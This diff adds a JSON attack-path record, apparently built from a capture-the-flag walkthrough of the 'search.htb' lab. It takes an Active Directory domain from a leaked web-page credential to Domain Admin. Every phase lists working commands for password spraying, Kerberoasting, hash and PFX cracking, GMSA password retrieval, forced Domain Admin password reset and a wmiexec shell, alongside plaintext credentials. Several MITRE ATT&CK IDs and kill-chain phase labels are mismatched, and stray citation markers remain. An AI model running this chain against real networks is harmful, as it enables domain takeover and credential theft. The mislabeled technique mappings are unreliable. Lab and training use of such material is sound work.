@@ -1,0 +1,217 @@
+{
+  "id": "ap-0027",
+  "title": "Active Directory Compromise: Hidden Creds -> Kerberoasting -> GMSA Password Retrieval -> DA Compromise",
+  "summary": "Initial access gained via hidden credentials found on a web server, leading to domain user enumeration, Kerberoasting, and final domain administration compromise via GMSA Read privilege abuse.",
+  "attack_path_markdown": "### Step 1\nInitial enumeration and port scanning.\n### Step 2\nFind hidden credential hint on the web server.\n### Step 3\nValidate credentials via SMB password spray.\n### Step 4\nExploit Kerberoasting and reuse credentials.\n### Step 5\nFind protected Excel file, bypass protection, pivot using new credentials, and gain PowerShell Web Access (PSWA).\n### Step 6\nUse BloodHound to map GMSA privilege escalation and retrieve the GMSA managed password.\n### Step 7\nReset Domain Admin password via GMSA GenericAll privilege and achieve full domain compromise.",
+  "kill_chain": [
+    {
+      "phase_order": 1,
+      "phase_name": "Reconnaissance",
+      "description": "Gathering initial network and service information, followed by exhaustive web and AD enumeration to identify potential entry points and users.",
+      "actions": [
+        "Determine OS type and perform full TCP port scanning.",
+        "Perform version and service enumeration on open ports.",
+        "Update the /etc/hosts file to resolve the domain and subdomain names.",
+        "Enumerate web server technologies.",
+        "Inspect SSL certificates for alternative domain names.",
+        "Attempt DNS zone transfer and enumeration."
+      ],
+      "tools": ["nmap", "watweb", "ping", "curl", "dig", "openssl", "rpcclient"],
+      "techniques": [
+        "Network Scanning (Full TCP)",
+        "Service Enumeration",
+        "DNS Enumeration",
+        "Web Content Discovery"
+      ],
+      "mitre_ids": ["T1046", "T1087", "T1589.001"],
+      "indicators": ["TTL 127/128 (Windows)", "Open Ports (80, 443, 88, 389, 445)", "Domain: search.htb", "Subdomain: research.search.htb"],
+      "preconditions": "Network connectivity to the target.",
+      "expected_outcome": "List of open services and confirmed domain names.",
+      "confidence": 0.9,
+      "commands": [
+        "ping 10.10.11.129",
+        "nmap -p- -T4 -vvv -n -Pn 10.10.11.129 -oG all_ports",
+        "nmap -sV -sC -p [ports] 10.10.11.129 -oN total_nmap",
+        "watweb 10.10.11.129",
+        "curl -I -s search.htb [10]",
+        "dig @10.10.11.129 search.htb",
+        "openssl s_client -connect 10.10.11.129:443"
+      ]
+    },
+    {
+      "phase_order": 2,
+      "phase_name": "Weaponization",
+      "description": "Identifying a potential weak credential exposed on the web server.",
+      "actions": [
+        "Identify hidden credential hint in an image or sticky note on the web page."
+      ],
+      "tools": ["Browser/Visual Inspection"],
+      "techniques": ["Steganography (Visual)"],
+      "mitre_ids": ["T1589.001"],
+      "indicators": ["Hidden text found: 'Set Password to Joe Sharp Isolation is key?'"],
+      "preconditions": "Successful web content enumeration.",
+      "expected_outcome": "Candidate username and password: joe.sharp:isolationiskey?.",
+      "confidence": 0.9,
+      "commands": []
+    },
+    {
+      "phase_order": 3,
+      "phase_name": "Delivery",
+      "description": "Attempting initial access using discovered low-privileged credentials.",
+      "actions": [
+        "Perform linear password spraying/verification against SMB using the discovered credential."
+      ],
+      "tools": ["crackmapexec"],
+      "techniques": ["Password Spraying"],
+      "mitre_ids": ["T1110.003"],
+      "indicators": ["Successful authentication via SMB for joe.sharp."],
+      "preconditions": "Candidate credentials (joe.sharp:isolationiskey?) and SMB service active.",
+      "expected_outcome": "Valid domain user credential: joe.sharp:isolationiskey?.",
+      "confidence": 1.0,
+      "commands": [
+        "crackmapexec smb 10.10.11.129 -u users.txt -p 'isolationiskey?'"
+      ]
+    },
+    {
+      "phase_order": 4,
+      "phase_name": "Exploitation",
+      "description": "Deep Active Directory enumeration to find escalation paths and sensitive information, including Kerberoasting for hash cracking.",
+      "actions": [
+        "Enumerate all domain users and groups using RPC Client.",
+        "Perform detailed AD structure enumeration using LDAP.",
+        "Synchronize time to ensure successful Kerberos interaction.",
+        "Perform a Kerberoasting attack to retrieve the TGS hash for a viable service account (web_svc).",
+        "Crack the hash offline to obtain the plaintext password.",
+        "Check for credential reuse (web_svc password) against other users."
+      ],
+      "tools": ["rpcclient", "ldapdomaindump", "ntpdate", "GetUserSPNs.py", "john", "crackmapexec"],
+      "techniques": [
+        "Account Discovery (Domain/Group)",
+        "Kerberoasting (TGS Request)",
+        "Password Cracking (Offline)",
+        "Credential Reuse"
+      ],
+      "mitre_ids": ["T1087.002", "T1558.003", "T1078"],
+      "indicators": ["List of 105 domain users", "web_svc SPN hash [16]", "New valid credential set: web_svc:Mississipi [20]", "Credential reuse on edgar.jacobs"],
+      "preconditions": "Valid domain credentials (joe.sharp).",
+      "expected_outcome": "New set of high-value credentials or user list.",
+      "confidence": 0.9,
+      "commands": [
+        "rpcclient -U 'joe.sharp%isolationiskey?' 10.10.11.129 -c 'enumdomusers'",
+        "ldapdomaindump -u 'joe.sharp' -p 'isolationiskey?' 10.10.11.129",
+        "ntpdate 10.10.11.129",
+        "GetUserSPNs.py -dc-ip 10.10.11.129 search.htb -request -u 'joe.sharp' -p 'isolationiskey?'",
+        "john --wordlist=/usr/share/wordlists/rockyou.txt hash_file",
+        "crackmapexec smb 10.10.11.129 -u users.txt -p 'Mississipi' --continue-on-success"
+      ]
+    },
+    {
+      "phase_order": 5,
+      "phase_name": "Installation",
+      "description": "Gaining persistent remote access and finding further sensitive data via file shares and certificate abuse.",
+      "actions": [
+        "Enumerate SMB shares with new credentials (edgar.jacobs) to find sensitive files.",
+        "Download 'Fishing Attempts.xlsx' file.",
+        "Bypass XLSX file protection by modifying the XML structure.",
+        "Perform linear password spray based on content found in the Excel file to find new valid credentials (sierra.frye).",
+        "Download PFX certificates associated with the new user (sierra.frye).",
+        "Crack PFX certificate password.",
+        "Access Windows PowerShell Web Access (PSWA) using the certificate."
+      ],
+      "tools": ["smbmap", "smbclient", "unzip", "zip", "crackmapexec", "pfx2john", "john", "ffuf"],
+      "techniques": [
+        "File Share Discovery",
+        "Credentials in Files",
+        "XLSX Protection Bypass",
+        "PFX Certificate Cracking",
+        "Certificate Service Abuse (PSWA)"
+      ],
+      "mitre_ids": ["T1021.002", "T1555.003", "T1078.002", "T1555.004"],
+      "indicators": ["New user credentials (sierra.frye)", "PFX certificate password ('Mississipi')", "PSWA access gained"],
+      "preconditions": "Valid Kerberoasted credentials (web_svc/edgar.jacobs).",
+      "expected_outcome": "PowerShell session via PSWA as sierra.frye.",
+      "commands": [
+        "smbmap -u 'edgar.jacobs' -p 'Mississipi' 10.10.11.129",
+        "smbclient //10.10.11.129/redirected_folders$/edgar.jacobs/Desktop -c 'get \"Fishing Attempts.xlsx\"'",
+        "unzip Fishing\\ Attempts.xlsx",
+        "zip -r document.xlsx xl",
+        "crackmapexec smb 10.10.11.129 -u data/users.txt -p data/credentials.txt --no-bruteforce --continue-on-success",
+        "smbclient //10.10.11.129/redirected_folders$/sierra.frye/Downloads -c 'get \"Staff.pfx\"'",
+        "pfx2john Staff.pfx > hash_file",
+        "john --wordlist=/usr/share/wordlists/rockyou.txt hash_file",
+        "ffuf -w [dictionary] -mc 200,301,302,401,403 -u https://search.htb/FUZZ"
+      ]
+    },
+    {
+      "phase_order": 6,
+      "phase_name": "Command and Control",
+      "description": "Mapping privilege escalation paths using BloodHound and retrieving the Managed Service Account (GMSA) password.",
+      "actions": [
+        "Collect and analyze BloodHound data (via Python inyector) to map AD object relationships, specifically identifying the ReadGMSA.Password privilege chain from sierra.frye to Domain Admin.",
+        "Leverage PowerShell to retrieve the GMSA managed password using the identified attribute."
+      ],
+      "tools": ["BloodHound.py", "BloodHound", "PowerShell (Get-ADServiceAccount)"],
+      "techniques": [
+        "Managed Service Account Credential Retrieval",
+        "PowerShell Execution"
+      ],
+      "mitre_ids": ["T1482", "T1558.004"],
+      "indicators": ["ReadGMSA.Password privilege path identified", "GMSA account password retrieved"],
+      "preconditions": "PSWA access as sierra.frye and BloodHound data collected.",
+      "expected_outcome": "GMSA account password (bird_adfs_gmsa) obtained.",
+      "confidence": 0.9,
+      "commands": [
+        "python3 bloodhound.py -u 'sierra.frye' -p '4R5T_yhU7*' -d search.htb -ns 10.10.11.129 -c all",
+        "$GMSA = Get-ADServiceAccount -Identity 'bird_adfs_gmsa' -Properties msDS-ManagedPassword",
+        "$GMSA.'msDS-ManagedPassword' | ConvertTo-ADManagedPasswordString"
+      ]
+    },
+    {
+      "phase_order": 7,
+      "phase_name": "Actions on Objectives",
+      "description": "Achieving Domain Administrator (DA) access by exploiting GenericAll privilege over a DA account.",
+      "actions": [
+        "Verify GMSA credential usage by establishing a secure PowerShell credential and executing a command (whoami).",
+        "Exploit the GMSA's GenericAll privilege over the Domain Admin account (tristan.davis) to reset the DA password.",
+        "Connect remotely using the newly compromised DA credentials to gain a high-privileged interactive shell and obtain the root flag."
+      ],
+      "tools": ["PowerShell (Invoke-Command, Set-ADAccountPassword)", "wmiexec.py"],
+      "techniques": [
+        "Password Reset (GenericAll Privilege Abuse)",
+        "Remote Execution (Lateral Tool Transfer)"
+      ],
+      "mitre_ids": ["T1546.002", "T1552.006"],
+      "indicators": ["Successful DA password reset [43]", "NT Authority/System access."],
+      "preconditions": "GMSA password obtained and GenericAll privilege identified.",
+      "expected_outcome": "Full compromise of the domain (Root flag obtained).",
+      "confidence": 1.0,
+      "commands": [
+        "$SecurePassword = [Runtime.InteropServices.Marshal]::PtrToCoTaskMemSecureString($GMSA.'msDS-ManagedPassword'.CurrentPassword)",
+        "$Cred = New-Object System.Management.Automation.PSCredential(\"bird_adfs_gmsa\", $SecurePassword)",
+        "Invoke-Command -ComputerName localhost -Credential $Cred -ScriptBlock {whoami}",
+        "Set-ADAccountPassword -Identity 'tristan.davis' -NewPassword 'Sabitar123!' -Reset",
+        "wmiexec.py search.htb/tristan.davis:'Sabitar123!'@10.10.11.129"
+      ]
+    }
+  ],
+  "tactics": [
+    "Reconnaissance",
+    "Credential Access",
+    "Privilege Escalation",
+    "Lateral Movement",
+    "Discovery"
+  ],
+  "techniques": [
+    "Kerberoasting [16]",
+    "Managed Service Account Credential Retrieval",
+    "GenericAll Abuse",
+    "Password Spraying"
+  ],
+  "mitre_ids": ["T1558.003", "T1558.004", "T1087.002", "T1110.003"],
+  "hosts": ["10.10.11.129", "search.htb", "research.search.htb"],
+  "privs_obtained": ["domain user", "Domain Administrator", "NT Authority/System"],
+  "confidence": 0.95,
+  "source_file": "",
+  "notes": "AD environment compromise centered around service accounts and critical permissions.",
+  "labels": ["attack_path", "active_directory", "gmsa", "kerberoasting", "powershell"]
+}
